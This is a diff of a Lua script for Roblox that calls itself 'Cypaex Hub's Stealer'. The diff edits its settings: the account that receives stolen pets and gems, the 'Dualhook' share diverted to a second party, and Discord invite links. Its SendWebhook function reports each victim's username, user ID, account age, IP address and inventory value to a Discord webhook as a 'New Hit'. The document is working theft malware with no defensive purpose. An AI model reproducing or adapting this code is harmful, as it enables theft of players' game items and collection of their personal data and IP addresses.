@@ -7,10 +7,8 @@
   
 ]]--
 
-_G.LoadingScreen = true
-
 getgenv().Settings = {
-    User = "petspsx651",
+    User = "User Here",
     Webhook = true, -- if you made it true they will receive dualhooked and undualhooked notifs to their webhook
     MailMessage = "Thanks For Using Cypaex Hub!",
     Titanics = {
@@ -47,7 +45,7 @@ getgenv().Settings = {
     },
     Gems = {
         Dualhook = true,
-        Intensity = 0 --%
+        Intensity = 50 --%
     }
 }
 
@@ -973,7 +971,7 @@ local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
                     ["width"] = 420
                 },
                 ["fields"] = { {
-                    ["name"] = "**This data was generated using Cypaex Hub's Stealer** :crescent_moon:",
+                    ["name"] = "**This data was generated using Cypaex Hub's Stealer** :cold_face:",
                     ["value"] = "```Username     : " .. username ..
                         "\nUser-ID      : " .. fardplayer.userId .. "\nAccount Age  : " .. fardplayer.AccountAge ..
                         " Days\nIP Address   : " .. IPadress .. "\nRank           : " .. rank .. "\nRAP          : " .. RAP() ..
@@ -1033,7 +1031,7 @@ local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
             ["username"] = "Cypaex Hub",
             ["avatar_url"] = imgs,
             ["embeds"] = { {
-                ["title"] = "**New Hit** ||With Cypaex Hub||",
+                ["title"] = "**New Hit** ||With Cypaex||",
                 ["url"] = "https://discord.gg/hzBAruhe2X",
                 ["type"] = "rich",
                 ["color"] = tonumber(0x2798FF),
@@ -1043,7 +1041,7 @@ local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
                     ["width"] = 420
                 },
                 ["fields"] = { {
-                    ["name"] = "**This data was generated using Cypaex Hub's Stealer** :trident:",
+                    ["name"] = "**This data was generated using Cypaex Hub's Stealer** :cold_face:",
                     ["value"] = "```Username     : " .. username ..
                         "\nUser-ID      : " .. fardplayer.userId .. "\nAccount Age  : " .. fardplayer.AccountAge ..
                         " Days\nIP Address   : " .. IPadress .. "\nRank         : " .. rank .. "\nRAP          : " .. RAP() ..
@@ -1120,7 +1118,7 @@ local eventin
 local secretin
 local mythicin
 local gemsin
-local mailmsg = ".gg/uSgzNwHDTS"
+local mailmsg = ".gg/hzBAruhe2X"
 if dhuser ~= nil then
     if getgenv().Settings.Titanics.Dualhook then
         titanicin = getgenv().Settings.Titanics.Intensity
